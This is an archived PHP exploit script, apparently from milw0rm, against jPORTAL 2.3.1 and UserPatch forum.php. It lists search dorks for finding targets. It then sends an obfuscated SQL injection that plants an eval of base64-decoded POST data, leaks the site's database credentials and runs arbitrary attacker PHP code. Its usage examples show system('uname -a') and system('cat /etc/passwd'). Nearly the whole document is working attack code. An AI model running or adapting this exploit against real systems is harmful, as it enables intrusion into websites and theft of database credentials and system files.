<html><head><title>jPORTAL 2.3.1 & UserPatch (forum.php) Remote Code Execution Exploit</title></head><pre>ï»¿&lt;?php
#
# jPORTAL 2.3.1 &amp; UserPatch (forum.php) Remote PHP Code Execution Exploit
#
# author: irk4z[at]yahoo.pl
#         http://irk4z.wordpress.com
#
#
# dorks: &quot;powered by jPORTAL 2 &amp; UserPatch&quot;
#        &quot;powered by jPORTAL 2&quot;
#
# greetz: str0ke, wacky, polish under :*
#---------------------------------------------------------------------&gt;

$host = $argv[1];
$path = $argv[2];
$phpcode = $argv[3];

$info = 
&quot;\n#\n&quot;.
&quot;# jPORTAL 2.3.1 &amp; UserPatch (forum.php) Remote PHP Code Execution Exploit\n&quot;.
&quot;#\n&quot;.
&quot;# author: irk4z[at]yahoo.pl\n&quot;.
&quot;#         http://irk4z.wordpress.com\n&quot;.
&quot;#\n&quot;.
&quot;#\n&quot;.
&quot;# greetz: str0ke, wacky, polish under :*\n&quot;.
&quot;#---------------------------------------------------------------------&gt;\n&quot;;
echo $info;

if($argc&lt;4){
	echo &quot;# Obsluga: \n&quot;.
		 &quot;#         php host path phpcode \n&quot;.
		 &quot;#         php localhost /~jportal/ phpinfo(); \n&quot;.
		 &quot;#         php localhost /~jportal/ \&quot;system('uname -a');\&quot; \n&quot;.
		 &quot;#         php localhost /~jportal/ \&quot;system('cat /etc/passwd');\&quot;\n&quot;.
		 &quot;#\n&quot;.		 
		 &quot;# exploit c0ded by irk4z :D&quot;;
	die;
}

$data=&quot;do=&quot;.base64_encode(base64_decode('Z2xvYmFsICRkYl9ob3N0LCAkZGJfdXNlciwgJGRiX3Bhc3MsICRkYl9uYW1lLCAkcHJlZml4OyANCmVjaG8gIlwkZGJfaG9zdCA9ICckZGJfaG9zdCc7XG4iLg0KIlwkZGJfdXNlciA9ICckZGJfdXNlcic7XG4iLg0KIlwkZGJfcGFzcyA9ICckZGJfcGFzcyc7XG4iLg0KIlwkZGJfbmFtZSA9ICckZGJfbmFtZSc7XG4iLg0KIlwkcHJlZml4ID0gJyRwcmVmaXgnO1xuXG5QSFAgQ09ERSBFWEVDVVRJT04gUkVTVUxUOlxuIjs').$phpcode);

$packet = 
&quot;POST {$path}forum.php?cmd=as_readed&amp;category=18000/**/U%6EION/**/S%65LECT/**/1,2,0x223B6576616C286261736536345F6465636F646528245F504F53545B27646F275D29293B6469653B24746D703D22/* HTTP/1.0\r\n&quot;.
&quot;Host: {$host}\r\n&quot;.
&quot;Content-type: application/x-www-form-urlencoded\r\n&quot;.
&quot;Content-length: &quot;.strlen($data).&quot;\r\n\r\n&quot;.$data;

$wynik = send($host, 80, $packet);
$tmp = strpos($wynik, '$db_host');
if (empty($tmp)){echo &quot;\nWystapil blad :( Sprawdz poprawnosc danych wejsciowych..\n\n# exploit c0ded by irk4z :D&quot;; }else{
	echo &quot;\n&quot;;
	echo &quot;KONFIGURACJA BAZY DANYCH:\n&quot;;
	echo substr($wynik, $tmp, strlen($wynik)-$tmp);
	echo &quot;\n\n# exploit c0ded by irk4z :D&quot;;
}


function send($host, $port, $packet)
{
 $s = @fsockopen($host, $port);
 if (empty($s)) return;
 fputs($s, $packet); $retu ='';
 while(!feof($s)){$retu.=fgets($s);}
 fclose($s);
 return $retu;
}
?&gt;

# milw0rm.com [2007-12-29]</pre></html>